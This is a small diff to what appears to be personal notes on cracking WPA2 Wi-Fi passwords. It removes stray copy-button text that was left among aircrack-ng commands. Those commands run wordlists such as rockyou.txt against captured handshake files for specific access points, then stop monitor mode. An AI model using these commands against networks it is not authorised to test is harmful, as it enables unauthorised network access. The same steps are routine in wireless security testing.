@@ -48,8 +48,6 @@ aircrack-ng -a2 -b 78:1D:BA:93:1F:9A -w /root/Desktop/rockyou.txt
 
 aircrack-ng -a2 -b A8:32:9A:00:66:E8 -w /media/root/CAF04BE4F04BD57B/test/word.txt /media/root/CAF04BE4F04BD57B/test/Digicom-01.cap
 Stop Monitor Mode
-bash
-Copy
-Edit
 airmon-ng stop wlan0mon
 service network-manager restart
+
